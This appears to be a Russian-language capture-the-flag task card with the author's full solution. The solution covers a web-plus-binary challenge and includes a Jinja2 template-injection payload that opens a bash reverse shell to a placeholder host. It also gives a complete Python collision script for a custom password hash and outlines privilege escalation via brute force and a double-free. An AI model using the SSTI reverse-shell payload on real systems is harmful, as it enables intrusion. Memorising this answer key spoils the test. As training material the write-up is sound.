# Очередная бета

## Категория
Квест

## Описание
Мой бот для обнаружения сайтов засёк что-то странное, видимо это чей-то новый сайтик. Я успел взять только этот файл, но надеюсь он тебе поможет.
PS: флаг = пользователь_рут

## Сложность
Medium

## Стоимость
550

## Файлы
cipher.py

## Хостинг
Нужен

## Флаг
flag_plug

==========

## решение
1. Заходим на сайт, логинимся и видим, что можно отправить запрос в бд.
2. После того, как поняли, что sqli тут нет, узнаём, что сайт работает на python3 => пробуем ssti и она работает.
```
{{ config.__class__.__init__.__globals__['os'].system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"') }}
```
3. Читаем файл search.py, и понимаем, что мы в другой vm. Пытаемся подставить secret_key для подделки jwt, но без толку => читаем бд через python скрипт.
4. Получили пароль и логин от админа. Теперь вспоминаем проинтересный файл, и ОЧЕВИДНО ПОНИМАЕМ, что хэш сделан через функцию `hash_string`. Тут 2 варианта
4.1. Мы брутим и ИДЕЙНО получаем нужное (не тот вектор атаки)
4.2. Смотрим на файл, и понимаем, что легче составить возможную строку, чей хэш будет таким же как и хэш пароля.
```python3
import random
import string
import time


CHARACTERS = string.ascii_letters + string.digits
CHAR_LEN = len(CHARACTERS)
HASH_SIZE = 4 * 8

def normal_string(s):
    s_size = len(s)
    if s_size == 1:
        s = s + (chr(ord(s) ^ HASH_SIZE))
    if s_size < HASH_SIZE:
        for i in range(s_size, HASH_SIZE):
            s += CHARACTERS[(ord(s[i - s_size]) + ord(s[i - s_size + 1])) % len(CHARACTERS)]
    
    return s

def create_segm_arr(s):
    seg_len = len(s) // HASH_SIZE
    num_not_norm_seg = (len(s) % HASH_SIZE)
    
    segm = []
    for i in range(0, len(s) - (num_not_norm_seg * (seg_len + 1)), seg_len):
        segm.append(s[i:i+seg_len])

    for i in range(len(s) - (num_not_norm_seg * (seg_len + 1)), len(s), seg_len+1):
        segm.append(s[i:i+seg_len+1])
    
    return segm

def sum_of_string(s):
    return sum(map(ord, s))


def hashing(arr):
    HASH = []
    for i in range(1, len(arr)):
        index = (sum_of_string(arr[i - 1]) + sum_of_string(arr[i])) % CHAR_LEN
        HASH.append(CHARACTERS[index])
    return ''.join(HASH)

def hash_string(s):
    return hashing(create_segm_arr(normal_string(s)))

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_specific_string(itteration):
    CHARACTERS = string.ascii_letters + string.digits
    base = len(CHARACTERS)
    if itteration == 0:
        return CHARACTERS[0]  # Handle the case for 0
    result = []
    while itteration > 0:
        remainder = itteration % base
        result.append(CHARACTERS[remainder])  # Get the character for the remainder
        itteration //= base

    result.reverse()  # Reverse the result to get the correct order
    return ''.join(result)

def find_el(multiplier, posible_str, el):
    return chr(CHARACTERS.index(el) + CHAR_LEN * multiplier - ord(posible_str[-1]))

def find_colision(hashed_str):
    posible_strs = []
    for main_el in CHARACTERS:
        try:
            posible_str = main_el
            for el in hashed_str:
                mul = 7
                new_el = find_el(mul, posible_str, el)
#                while new_el not in CHARACTERS:
#                    print(ord(new_el), CHARACTERS.index(el) + CHAR_LEN * mul)
#                    mul += 1
#                    if CHARACTERS.index(el) + CHAR_LEN * mul == 321: exit("WOW " + str(mul) + " " + new_el + " " + str(ord(new_el)) + " " + posible_str)
#                    new_el = find_el(mul, posible_str, el)
#                    if mul > 10:
#                        print("Too much")
#                        raise ValueError
                #print(posible_str)
                
                posible_str += new_el
                    
            posible_strs.append(posible_str)
        except ValueError:
            pass
    return posible_strs

def remove_unprintable_chars(s):
    return ''.join(filter(str.isprintable, s))

h = input(">> ")

col = find_colision(h)
for el in col:
    if len(remove_unprintable_chars(el)) == HASH_SIZE:
        print(h, el, hash_string(el))
        exit()
```
5. Нашли подходящую строку => логинимся, и видим лень автора - форму в `/admin` для отправки shell команд. Получаем реверм шелл.
6. А вот тут хитро (в целом автора тут можно поругать): мы - `www-data`, и нам надо повысить привилегии. Смотрим пользователей, и видим `macqueen`. Тут вспоминаем про бота на `/search`, и смотрим кто это вообще? А это бот, который может найти пароль по имени пользователя => ищем через него нашего macqueen, брутим пароль и готово, флаг пользователя наш.
7. Классическое `sudo -l` подсказывает сервис `/opt/login`. При реверсе видим double-free и system при успешной эксплуатации. Хоп-хоп и готов рут.
